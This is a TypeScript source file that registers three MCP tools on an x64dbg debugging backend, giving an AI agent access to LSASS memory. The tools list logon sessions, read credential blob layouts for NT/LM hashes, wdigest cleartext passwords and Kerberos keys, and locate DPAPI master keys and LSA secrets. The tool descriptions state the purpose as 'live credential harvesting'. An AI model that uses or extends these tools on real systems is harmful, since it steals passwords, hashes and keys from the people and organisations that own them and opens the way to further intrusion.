import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { httpClient } from '../http_client.js';

export function registerLsassDpapiBlobReaderTools(server: McpServer) {
  server.tool(
    'x64dbg_lsass_list_sessions',
    'Enumerate lsass.exe logon sessions and identify loaded SSP packages (msv1_0, wdigest, kerberos, samsrv, dpapi). Requires SeDebugPrivilege. Returns lsass PID, handle acquisition status, LogonSessionList structure offsets, and all credential-bearing SSP modules.',
    {},
    async () => {
      const result = await httpClient.post('/api/lsass/list_sessions', {});
      return { content: [{ type: 'text', text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    'x64dbg_lsass_read_credential_blobs',
    'Read LSASS credential blob structure offsets for msv1_0 (NT/LM hashes), wdigest (cleartext passwords when enabled), and kerberos (ticket/session keys). Returns field layouts, encryption schemes (RC4/AES+LSAProtectMemory), and step-by-step extraction chain for live credential harvesting.',
    {},
    async () => {
      const result = await httpClient.post('/api/lsass/read_credential_blobs', {});
      return { content: [{ type: 'text', text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    'x64dbg_lsass_locate_dpapi_keys',
    'Locate DPAPI master keys cached in LSASS memory. Returns _DPAPI_MASTER_KEY_CACHE structure walk strategy, LSA secret targets (DPAPI_SYSTEM, $MACHINE.ACC, _SC_ServiceName, DefaultPassword, NL$KM), and step-by-step master key extraction procedure for offline DPAPI decryption.',
    {},
    async () => {
      const result = await httpClient.post('/api/lsass/locate_dpapi_keys', {});
      return { content: [{ type: 'text', text: JSON.stringify(result, null, 2) }] };
    }
  );
}
